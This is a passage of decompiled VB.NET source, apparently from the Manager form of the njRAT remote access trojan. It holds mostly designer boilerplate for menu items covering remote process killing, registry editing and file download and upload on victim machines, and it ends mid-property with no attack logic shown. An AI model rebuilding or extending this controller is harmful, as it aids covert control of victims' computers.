Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000013 RID: 19
	<DesignerGenerated()>
	Public Partial Class Manager
		Inherits Form

		' Token: 0x06000251 RID: 593 RVA: 0x00015068 File Offset: 0x00013268
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Manager.__ENCList
			SyncLock _ENCList
				If Manager.__ENCList.Count = Manager.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Manager.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Manager.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Manager.__ENCList(num) = Manager.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Manager.__ENCList.RemoveRange(num, Manager.__ENCList.Count - num)
					Manager.__ENCList.Capacity = Manager.__ENCList.Count
				End If
				Manager.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170000D3 RID: 211
		' (get) Token: 0x06000254 RID: 596 RVA: 0x00017D50 File Offset: 0x00015F50
		' (set) Token: 0x06000255 RID: 597 RVA: 0x00002D02 File Offset: 0x00000F02
		Friend Overridable Property StatusStrip1 As StatusStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._StatusStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As StatusStrip)
				Me._StatusStrip1 = value
			End Set
		End Property

		' Token: 0x170000D4 RID: 212
		' (get) Token: 0x06000256 RID: 598 RVA: 0x00017D68 File Offset: 0x00015F68
		' (set) Token: 0x06000257 RID: 599 RVA: 0x00017D80 File Offset: 0x00015F80
		Friend Overridable Property SL As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._SL
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.SL_Click
				If Me._SL IsNot Nothing Then
					RemoveHandler Me._SL.Click, value2
				End If
				Me._SL = value
				If Me._SL IsNot Nothing Then
					AddHandler Me._SL.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D5 RID: 213
		' (get) Token: 0x06000258 RID: 600 RVA: 0x00017DD8 File Offset: 0x00015FD8
		' (set) Token: 0x06000259 RID: 601 RVA: 0x00002D0B File Offset: 0x00000F0B
		Friend Overridable Property pr As ToolStripProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._pr
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripProgressBar)
				Me._pr = value
			End Set
		End Property

		' Token: 0x170000D6 RID: 214
		' (get) Token: 0x0600025A RID: 602 RVA: 0x00017DF0 File Offset: 0x00015FF0
		' (set) Token: 0x0600025B RID: 603 RVA: 0x00002D14 File Offset: 0x00000F14
		Friend Overridable Property M1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._M1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._M1 = value
			End Set
		End Property

		' Token: 0x170000D7 RID: 215
		' (get) Token: 0x0600025C RID: 604 RVA: 0x00017E08 File Offset: 0x00016008
		' (set) Token: 0x0600025D RID: 605 RVA: 0x00017E20 File Offset: 0x00016020
		Friend Overridable Property KillToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillToolStripMenuItem1_Click
				If Me._KillToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._KillToolStripMenuItem1.Click, value2
				End If
				Me._KillToolStripMenuItem1 = value
				If Me._KillToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._KillToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D8 RID: 216
		' (get) Token: 0x0600025E RID: 606 RVA: 0x00017E78 File Offset: 0x00016078
		' (set) Token: 0x0600025F RID: 607 RVA: 0x00017E90 File Offset: 0x00016090
		Friend Overridable Property KillDeleteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillDeleteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillDeleteToolStripMenuItem_Click
				If Me._KillDeleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._KillDeleteToolStripMenuItem.Click, value2
				End If
				Me._KillDeleteToolStripMenuItem = value
				If Me._KillDeleteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._KillDeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D9 RID: 217
		' (get) Token: 0x06000260 RID: 608 RVA: 0x00017EE8 File Offset: 0x000160E8
		' (set) Token: 0x06000261 RID: 609 RVA: 0x00017F00 File Offset: 0x00016100
		Friend Overridable Property RestartProcessToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartProcessToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartProcessToolStripMenuItem_Click
				If Me._RestartProcessToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RestartProcessToolStripMenuItem.Click, value2
				End If
				Me._RestartProcessToolStripMenuItem = value
				If Me._RestartProcessToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RestartProcessToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DA RID: 218
		' (get) Token: 0x06000262 RID: 610 RVA: 0x00017F58 File Offset: 0x00016158
		' (set) Token: 0x06000263 RID: 611 RVA: 0x00017F70 File Offset: 0x00016170
		Friend Overridable Property vmethod_26 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_26_Tick
				If Me._vmethod_26 IsNot Nothing Then
					RemoveHandler Me._vmethod_26.Tick, value2
				End If
				Me._vmethod_26 = value
				If Me._vmethod_26 IsNot Nothing Then
					AddHandler Me._vmethod_26.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000DB RID: 219
		' (get) Token: 0x06000264 RID: 612 RVA: 0x00017FC8 File Offset: 0x000161C8
		' (set) Token: 0x06000265 RID: 613 RVA: 0x00002D1D File Offset: 0x00000F1D
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x170000DC RID: 220
		' (get) Token: 0x06000266 RID: 614 RVA: 0x00017FE0 File Offset: 0x000161E0
		' (set) Token: 0x06000267 RID: 615 RVA: 0x00002D26 File Offset: 0x00000F26
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x170000DD RID: 221
		' (get) Token: 0x06000268 RID: 616 RVA: 0x00017FF8 File Offset: 0x000161F8
		' (set) Token: 0x06000269 RID: 617 RVA: 0x00018010 File Offset: 0x00016210
		Friend Overridable Property KillConnectionToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillConnectionToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillConnectionToolStripMenuItem_Click
				If Me._KillConnectionToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._KillConnectionToolStripMenuItem.Click, value2
				End If
				Me._KillConnectionToolStripMenuItem = value
				If Me._KillConnectionToolStripMenuItem IsNot Nothing Then
					AddHandler Me._KillConnectionToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DE RID: 222
		' (get) Token: 0x0600026A RID: 618 RVA: 0x00018068 File Offset: 0x00016268
		' (set) Token: 0x0600026B RID: 619 RVA: 0x00002D2F File Offset: 0x00000F2F
		Friend Overridable Property crg As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._crg
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._crg = value
			End Set
		End Property

		' Token: 0x170000DF RID: 223
		' (get) Token: 0x0600026C RID: 620 RVA: 0x00018080 File Offset: 0x00016280
		' (set) Token: 0x0600026D RID: 621 RVA: 0x00018098 File Offset: 0x00016298
		Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem_Click
				If Me._RefreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem = value
				If Me._RefreshToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E0 RID: 224
		' (get) Token: 0x0600026E RID: 622 RVA: 0x000180F0 File Offset: 0x000162F0
		' (set) Token: 0x0600026F RID: 623 RVA: 0x00018108 File Offset: 0x00016308
		Friend Overridable Property EditToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EditToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem_Click
				If Me._EditToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._EditToolStripMenuItem.Click, value2
				End If
				Me._EditToolStripMenuItem = value
				If Me._EditToolStripMenuItem IsNot Nothing Then
					AddHandler Me._EditToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E1 RID: 225
		' (get) Token: 0x06000270 RID: 624 RVA: 0x00018160 File Offset: 0x00016360
		' (set) Token: 0x06000271 RID: 625 RVA: 0x00018178 File Offset: 0x00016378
		Friend Overridable Property NewValueToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewValueToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewValueToolStripMenuItem_Click
				If Me._NewValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._NewValueToolStripMenuItem.Click, value2
				End If
				Me._NewValueToolStripMenuItem = value
				If Me._NewValueToolStripMenuItem IsNot Nothing Then
					AddHandler Me._NewValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E2 RID: 226
		' (get) Token: 0x06000272 RID: 626 RVA: 0x000181D0 File Offset: 0x000163D0
		' (set) Token: 0x06000273 RID: 627 RVA: 0x000181E8 File Offset: 0x000163E8
		Friend Overridable Property DeleteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem_Click
				If Me._DeleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DeleteToolStripMenuItem.Click, value2
				End If
				Me._DeleteToolStripMenuItem = value
				If Me._DeleteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E3 RID: 227
		' (get) Token: 0x06000274 RID: 628 RVA: 0x00018240 File Offset: 0x00016440
		' (set) Token: 0x06000275 RID: 629 RVA: 0x00002D38 File Offset: 0x00000F38
		Friend Overridable Property rimg As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._rimg
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._rimg = value
			End Set
		End Property

		' Token: 0x170000E4 RID: 228
		' (get) Token: 0x06000276 RID: 630 RVA: 0x00018258 File Offset: 0x00016458
		' (set) Token: 0x06000277 RID: 631 RVA: 0x00002D41 File Offset: 0x00000F41
		Friend Overridable Property crgk As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._crgk
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._crgk = value
			End Set
		End Property

		' Token: 0x170000E5 RID: 229
		' (get) Token: 0x06000278 RID: 632 RVA: 0x00018270 File Offset: 0x00016470
		' (set) Token: 0x06000279 RID: 633 RVA: 0x00018288 File Offset: 0x00016488
		Friend Overridable Property RefreshToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem1_Click
				If Me._RefreshToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem1.Click, value2
				End If
				Me._RefreshToolStripMenuItem1 = value
				If Me._RefreshToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E6 RID: 230
		' (get) Token: 0x0600027A RID: 634 RVA: 0x000182E0 File Offset: 0x000164E0
		' (set) Token: 0x0600027B RID: 635 RVA: 0x000182F8 File Offset: 0x000164F8
		Friend Overridable Property CreateKeyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CreateKeyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CreateKeyToolStripMenuItem_Click
				If Me._CreateKeyToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CreateKeyToolStripMenuItem.Click, value2
				End If
				Me._CreateKeyToolStripMenuItem = value
				If Me._CreateKeyToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CreateKeyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E7 RID: 231
		' (get) Token: 0x0600027C RID: 636 RVA: 0x00018350 File Offset: 0x00016550
		' (set) Token: 0x0600027D RID: 637 RVA: 0x00018368 File Offset: 0x00016568
		Friend Overridable Property DeleteSelectedToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteSelectedToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteSelectedToolStripMenuItem_Click
				If Me._DeleteSelectedToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DeleteSelectedToolStripMenuItem.Click, value2
				End If
				Me._DeleteSelectedToolStripMenuItem = value
				If Me._DeleteSelectedToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DeleteSelectedToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E8 RID: 232
		' (get) Token: 0x0600027E RID: 638 RVA: 0x000183C0 File Offset: 0x000165C0
		' (set) Token: 0x0600027F RID: 639 RVA: 0x00002D4A File Offset: 0x00000F4A
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip2 = value
			End Set
		End Property

		' Token: 0x170000E9 RID: 233
		' (get) Token: 0x06000280 RID: 640 RVA: 0x000183D8 File Offset: 0x000165D8
		' (set) Token: 0x06000281 RID: 641 RVA: 0x000183F0 File Offset: 0x000165F0
		Friend Overridable Property StopToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._StopToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StopToolStripMenuItem_Click
				If Me._StopToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._StopToolStripMenuItem.Click, value2
				End If
				Me._StopToolStripMenuItem = value
				If Me._StopToolStripMenuItem IsNot Nothing Then
					AddHandler Me._StopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EA RID: 234
		' (get) Token: 0x06000282 RID: 642 RVA: 0x00018448 File Offset: 0x00016648
		' (set) Token: 0x06000283 RID: 643 RVA: 0x00018460 File Offset: 0x00016660
		Friend Overridable Property PauseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._PauseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PauseToolStripMenuItem_Click
				If Me._PauseToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._PauseToolStripMenuItem.Click, value2
				End If
				Me._PauseToolStripMenuItem = value
				If Me._PauseToolStripMenuItem IsNot Nothing Then
					AddHandler Me._PauseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EB RID: 235
		' (get) Token: 0x06000284 RID: 644 RVA: 0x000184B8 File Offset: 0x000166B8
		' (set) Token: 0x06000285 RID: 645 RVA: 0x000184D0 File Offset: 0x000166D0
		Friend Overridable Property StartToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._StartToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StartToolStripMenuItem_Click
				If Me._StartToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._StartToolStripMenuItem.Click, value2
				End If
				Me._StartToolStripMenuItem = value
				If Me._StartToolStripMenuItem IsNot Nothing Then
					AddHandler Me._StartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EC RID: 236
		' (get) Token: 0x06000286 RID: 646 RVA: 0x00018528 File Offset: 0x00016728
		' (set) Token: 0x06000287 RID: 647 RVA: 0x00002D53 File Offset: 0x00000F53
		Friend Overridable Property ContextMenuStrip3 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip3 = value
			End Set
		End Property

		' Token: 0x170000ED RID: 237
		' (get) Token: 0x06000288 RID: 648 RVA: 0x00018540 File Offset: 0x00016740
		' (set) Token: 0x06000289 RID: 649 RVA: 0x00018558 File Offset: 0x00016758
		Friend Overridable Property UPToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UPToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UPToolStripMenuItem_Click
				If Me._UPToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UPToolStripMenuItem.Click, value2
				End If
				Me._UPToolStripMenuItem = value
				If Me._UPToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UPToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EE RID: 238
		' (get) Token: 0x0600028A RID: 650 RVA: 0x000185B0 File Offset: 0x000167B0
		' (set) Token: 0x0600028B RID: 651 RVA: 0x000185C8 File Offset: 0x000167C8
		Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem2_Click
				If Me._RefreshToolStripMenuItem2 IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem2.Click, value2
				End If
				Me._RefreshToolStripMenuItem2 = value
				If Me._RefreshToolStripMenuItem2 IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EF RID: 239
		' (get) Token: 0x0600028C RID: 652 RVA: 0x00018620 File Offset: 0x00016820
		' (set) Token: 0x0600028D RID: 653 RVA: 0x00018638 File Offset: 0x00016838
		Friend Overridable Property RunToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RunToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RunToolStripMenuItem_Click
				If Me._RunToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RunToolStripMenuItem.Click, value2
				End If
				Me._RunToolStripMenuItem = value
				If Me._RunToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RunToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F0 RID: 240
		' (get) Token: 0x0600028E RID: 654 RVA: 0x00018690 File Offset: 0x00016890
		' (set) Token: 0x0600028F RID: 655 RVA: 0x000186A8 File Offset: 0x000168A8
		Friend Overridable Property DeleteToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem1_Click
				If Me._DeleteToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._DeleteToolStripMenuItem1.Click, value2
				End If
				Me._DeleteToolStripMenuItem1 = value
				If Me._DeleteToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._DeleteToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F1 RID: 241
		' (get) Token: 0x06000290 RID: 656 RVA: 0x00018700 File Offset: 0x00016900
		' (set) Token: 0x06000291 RID: 657 RVA: 0x00018718 File Offset: 0x00016918
		Friend Overridable Property EditToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EditToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem1_Click
				If Me._EditToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._EditToolStripMenuItem1.Click, value2
				End If
				Me._EditToolStripMenuItem1 = value
				If Me._EditToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._EditToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F2 RID: 242
		' (get) Token: 0x06000292 RID: 658 RVA: 0x00018770 File Offset: 0x00016970
		' (set) Token: 0x06000293 RID: 659 RVA: 0x00018788 File Offset: 0x00016988
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RenameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RenameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F3 RID: 243
		' (get) Token: 0x06000294 RID: 660 RVA: 0x000187E0 File Offset: 0x000169E0
		' (set) Token: 0x06000295 RID: 661 RVA: 0x000187F8 File Offset: 0x000169F8
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F4 RID: 244
		' (get) Token: 0x06000296 RID: 662 RVA: 0x00018850 File Offset: 0x00016A50
		' (set) Token: 0x06000297 RID: 663 RVA: 0x00018868 File Offset: 0x00016A68
		Friend Overridable Property CutToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CutToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CutToolStripMenuItem_Click
				If Me._CutToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CutToolStripMenuItem.Click, value2
				End If
				Me._CutToolStripMenuItem = value
				If Me._CutToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CutToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F5 RID: 245
		' (get) Token: 0x06000298 RID: 664 RVA: 0x000188C0 File Offset: 0x00016AC0
		' (set) Token: 0x06000299 RID: 665 RVA: 0x000188D8 File Offset: 0x00016AD8
		Friend Overridable Property PasteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._PasteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasteToolStripMenuItem_Click
				If Me._PasteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._PasteToolStripMenuItem.Click, value2
				End If
				Me._PasteToolStripMenuItem = value
				If Me._PasteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._PasteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F6 RID: 246
		' (get) Token: 0x0600029A RID: 666 RVA: 0x00018930 File Offset: 0x00016B30
		' (set) Token: 0x0600029B RID: 667 RVA: 0x00018948 File Offset: 0x00016B48
		Friend Overridable Property DownloadToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DownloadToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DownloadToolStripMenuItem_Click
				If Me._DownloadToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DownloadToolStripMenuItem.Click, value2
				End If
				Me._DownloadToolStripMenuItem = value
				If Me._DownloadToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DownloadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F7 RID: 247
		' (get) Token: 0x0600029C RID: 668 RVA: 0x000189A0 File Offset: 0x00016BA0
		' (set) Token: 0x0600029D RID: 669 RVA: 0x000189B8 File Offset: 0x00016BB8
		Friend Overridable Property UploadToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UploadToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadToolStripMenuItem_Click
				If Me._UploadToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UploadToolStripMenuItem.Click, value2
